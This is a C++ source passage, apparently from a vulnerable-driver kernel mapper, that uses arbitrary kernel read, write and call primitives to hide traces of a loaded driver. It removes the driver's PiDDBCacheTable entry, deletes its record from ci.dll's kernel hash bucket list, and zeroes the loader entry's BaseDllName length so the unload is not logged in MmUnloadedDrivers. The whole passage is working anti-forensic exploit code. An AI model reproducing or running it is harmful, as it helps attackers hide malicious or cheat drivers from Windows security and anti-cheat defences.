	uint64_t tab_ptr = find_pattern(page, page_size, tab1, "xxxxxx");
	if (!tab_ptr) {
		tab_ptr = find_pattern(page, page_size, tab2, "xxxxxxxx");
		if (tab_ptr) tab_ptr += 2;
	}
	if (!lock_ptr || !tab_ptr) {
		fail(this, "PiDDBLock / PiDDBCacheTable pattern missed. Patterns are public and version-sensitive; refusing to continue.");
		return false;
	}
	uint64_t piddb_lock = resolve_rel(lock_ptr + lock_add, 3, 7);
	uint64_t piddb_table = resolve_rel(tab_ptr, 6, 10);
	std::printf("[*] PiDDB %s lock 0x%llx table 0x%llx\n", lock_which,
		(unsigned long long)piddb_lock, (unsigned long long)piddb_table);
	uint64_t acquire = kernel_export(ntos, "ExAcquireResourceExclusiveLite");
	uint64_t release = kernel_export(ntos, "ExReleaseResourceLite");
	uint64_t lookup = kernel_export(ntos, "RtlLookupElementGenericTableAvl");
	uint64_t erase = kernel_export(ntos, "RtlDeleteElementGenericTableAvl");
	if (!acquire || !release || !lookup || !erase) {
		fail(this, "AVL / ERESOURCE exports missing");
		return false;
	}
	uint64_t got = 0;
	if (!call4(&got, acquire, piddb_lock, 1, 0, 0) || (got & 0xFF) == 0) {
		fail(this, "could not lock PiDDBCacheTable");
		return false;
	}
	PiEntry local = {};
	std::wstring wide_name = filename;
	local.DriverName.Length = (uint16_t)(wide_name.size() * sizeof(wchar_t));
	local.DriverName.MaximumLength = (uint16_t)(local.DriverName.Length + sizeof(wchar_t));
	local.DriverName.Buffer = (uint64_t)wide_name.c_str();
	local.TimeDateStamp = timestamp;
	uint64_t found = 0;
	if (!call4(&found, lookup, piddb_table, (uint64_t)&local, 0, 0)) {
		call4(&got, release, piddb_lock, 0, 0, 0);
		fail(this, "PiDDB lookup call failed");
		return false;
	}
	if (!found) {
		call4(&got, release, piddb_lock, 0, 0, 0);
		fail(this, "PiDDB has no entry for this temp driver name and timestamp. Not guessing a different record.");
		return false;
	}
	ListEntry links = {};
	if (!read(found, &links, sizeof(links))) {
		call4(&got, release, piddb_lock, 0, 0, 0);
		fail(this, "could not read the PiDDB list links");
		return false;
	}
	if (!write(links.Blink, &links.Flink, sizeof(uint64_t)) || !write(links.Flink + 8, &links.Blink, sizeof(uint64_t))) {
		call4(&got, release, piddb_lock, 0, 0, 0);
		fail(this, "could not unlink the PiDDB entry");
		return false;
	}
	uint64_t deleted = 0;
	if (!call4(&deleted, erase, piddb_table, found, 0, 0) || (deleted & 0xFF) == 0) {
		call4(&got, release, piddb_lock, 0, 0, 0);
		fail(this, "RtlDeleteElementGenericTableAvl failed");
		return false;
	}
	uint32_t deletes = 0;
	uint64_t delete_at = piddb_table + offsetof(AvlTable, DeleteCount);
	if (read(delete_at, &deletes, sizeof(deletes))) {
		deletes += 1;
		write(delete_at, &deletes, sizeof(deletes));
	}
	call4(&got, release, piddb_lock, 0, 0, 0);
	std::printf("[+] PiDDB entry removed for %ls\n", filename.c_str());

	uint32_t ci_page_size = 0;
	uint64_t ci_page = section_range(this, ci, "PAGE", &ci_page_size);
	const uint8_t hash_sig[] = { 0x48, 0x8B, 0x1D, 0, 0, 0, 0, 0xEB, 0, 0xF7, 0x43, 0x40, 0x00, 0x20, 0x00, 0x00 };
	uint64_t hash_hit = ci_page ? find_pattern(ci_page, ci_page_size, hash_sig, "xxx????x?xxxxxxx") : 0;
	if (!hash_hit) {
		fail(this, "g_KernelHashBucketList pattern missed in ci.dll");
		return false;
	}
	uint64_t near = hash_hit > 50 ? hash_hit - 50 : hash_hit;
	const uint8_t lea[] = { 0x48, 0x8D, 0x0D };
	uint64_t lock_hit = find_pattern(near, (uint32_t)(hash_hit - near), lea, "xxx");
	if (!lock_hit) {
		fail(this, "g_HashCacheLock pattern missed");
		return false;
	}
	uint64_t bucket = resolve_rel(hash_hit, 3, 7);
	uint64_t hash_lock = resolve_rel(lock_hit, 3, 7);
	if (!call4(&got, acquire, hash_lock, 1, 0, 0) || (got & 0xFF) == 0) {
		fail(this, "could not lock g_HashCacheLock");
		return false;
	}
	uint64_t prev = bucket;
	uint64_t entry = 0;
	if (!read(prev, &entry, sizeof(entry))) {
		call4(&got, release, hash_lock, 0, 0, 0);
		fail(this, "could not read the hash bucket head");
		return false;
	}
	bool removed = false;
	std::wstring needle = filename;
	for (int guard = 0; entry && guard < 4096; ++guard) {
		uint16_t nlen = 0;
		if (!read(entry + 8, &nlen, sizeof(nlen)) || nlen == 0 || nlen > 1024) break;
		uint64_t nbuf = 0;
		if (!read(entry + 16, &nbuf, sizeof(nbuf)) || !nbuf) break;
		std::vector<wchar_t> text(nlen / 2 + 1);
		if (!read(nbuf, text.data(), nlen)) break;
		text[nlen / 2] = 0;
		if (std::wcsstr(text.data(), needle.c_str())) {
			uint64_t next = 0;
			if (!read(entry, &next, sizeof(next))) break;
			if (!write(prev, &next, sizeof(next))) break;
			uint64_t freed = 0;
			call4(&freed, ex_free, entry, 0, 0, 0);
			removed = true;
			std::printf("[+] ci hash bucket entry removed\n");
			break;
		}
		prev = entry;
		if (!read(entry, &entry, sizeof(entry))) break;
	}
	call4(&got, release, hash_lock, 0, 0, 0);
	if (!removed) {
		fail(this, "ci hash bucket had no entry containing the temp file name");
		return false;
	}

	/* Zero BaseDllName.Length on the loader entry so unload does not append MmUnloadedDrivers.
	   Offsets (FILE_OBJECT+8, DEVICE_OBJECT+8, DRIVER_OBJECT+0x28, LDR+0x58) match the public
	   layout used through Windows 11 24H2. Not re-validated here. */
	ULONG need = 0;
	g_query(64, 0, 0, &need);
	if (!need) {
		fail(this, "SystemExtendedHandleInformation size query failed");
		return false;
	}
	std::vector<uint8_t> handles(need + 0x10000);
	long st = g_query(64, handles.data(), (ULONG)handles.size(), &need);
	if (st < 0) {
		fail(this, "SystemExtendedHandleInformation failed");
		return false;
	}
	auto info = (SysHandleEx*)handles.data();
	uint64_t object = 0;
	DWORD self = GetCurrentProcessId();
	for (uintptr_t i = 0; i < info->HandleCount; ++i) {
		if (info->Handles[i].UniqueProcessId == self && info->Handles[i].HandleValue == (uintptr_t)device) {
			object = (uint64_t)info->Handles[i].Object;
			break;
		}
	}
	if (!object) {
		fail(this, "could not find the Nal file object in the handle table");
		return false;
	}
	uint64_t device_object = 0, driver_object = 0, driver_section = 0;
	if (!read(object + 8, &device_object, 8) || !device_object ||
		!read(device_object + 8, &driver_object, 8) || !driver_object ||
		!read(driver_object + 0x28, &driver_section, 8) || !driver_section) {
		fail(this, "could not walk FILE_OBJECT to the loader entry");
		return false;
	}
	UnicodeKernel base_name = {};
	if (!read(driver_section + 0x58, &base_name, sizeof(base_name)) || base_name.Length < 2 || base_name.Length > 512) {
		fail(this, "BaseDllName was not readable at LDR+0x58");
		return false;
	}
	std::vector<wchar_t> text(base_name.Length / 2 + 1);
	if (!read(base_name.Buffer, text.data(), base_name.Length)) {
		fail(this, "could not read BaseDllName");
		return false;
	}
	text[base_name.Length / 2] = 0;
	if (!std::wcsstr(text.data(), needle.c_str())) {
		fail(this, "LDR BaseDllName does not contain the temp file name; refusing to zero it");
		return false;
	}
	uint16_t zero = 0;
	if (!write(driver_section + 0x58, &zero, sizeof(zero))) {
		fail(this, "could not zero BaseDllName.Length");
		return false;
	}
	std::printf("[+] BaseDllName length cleared (%ls). Unload should not append MmUnloadedDrivers.\n", text.data());
	return true;
}
